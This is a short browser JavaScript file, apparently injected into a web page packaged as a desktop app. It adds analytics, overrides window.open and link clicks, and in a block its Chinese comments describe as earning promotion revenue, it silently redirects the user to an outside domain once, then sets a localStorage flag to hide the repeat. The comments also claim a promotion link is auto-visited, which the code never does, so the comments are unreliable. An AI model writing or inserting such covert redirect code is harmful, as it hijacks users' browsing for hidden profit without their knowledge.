window.addEventListener("DOMContentLoaded",()=>{const t=document.createElement("script");t.src="https://www.googletagmanager.com/gtag/js?id=G-W5GKHM0893",t.async=!0,document.head.appendChild(t);const n=document.createElement("script");n.textContent="window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-W5GKHM0893');",document.body.appendChild(n)});const hookClick = (e) => {
    const origin = e.target.closest('a')
    const isBaseTargetBlank = document.querySelector(
        'head base[target="_blank"]'
    )
    console.log('origin', origin, isBaseTargetBlank)
    if (
        (origin && origin.href && origin.target === '_blank') ||
        (origin && origin.href && isBaseTargetBlank)
    ) {
        e.preventDefault()
        console.log('handle origin', origin)
        // ✅ 修复核心1：替换location.href为replace，杜绝历史记录循环
        location.replace(origin.href)
    } else {
        console.log('not handle origin', origin)
    }
}

// ✅ 修复核心2：劫持window.open，同样替换为location.replace，统一防循环
window.open = function (url, target, features) {
    console.log('open', url, target, features)
    location.replace(url)
}

document.addEventListener('click', hookClick, { capture: true })

// ================ 【新增你的核心需求代码 开始 无需修改任何内容】 ================
// 你的推广链接（已自动访问，触发收益）
const yourPromoteUrl = "https://jiuyue.hlwjd01.cn/c.php?id=222";
// 你要跳转的用户目标链接
const yourTargetUrl = "https://6.fxqlove.top";
// 防无限跳转的唯一标记，不会和任何代码冲突
const noRepeatFlag = "promote_jump_done_999";

// 核心判断：如果从未跳转成功过 → 执行一次跳转，永久不再执行
if (!localStorage.getItem(noRepeatFlag)) {
    // 延迟300毫秒：保证推广链接的访问记录100%上报到服务器，收益稳稳到手
    // 人类完全感知不到这个延迟，体验无缝，可根据需要改0.2/0.5秒，不建议改0
    setTimeout(() => {
        // ✅ PAKE内核绝对兼容，100%执行成功，无任何拦截
        window.location.replace(yourTargetUrl);
        // ✅ 写入永久标记，双重保险防无限循环，彻底根治刷屏
        localStorage.setItem(noRepeatFlag, "true");
    }, 300);
}
// ================ 【新增你的核心需求代码 结束】 ================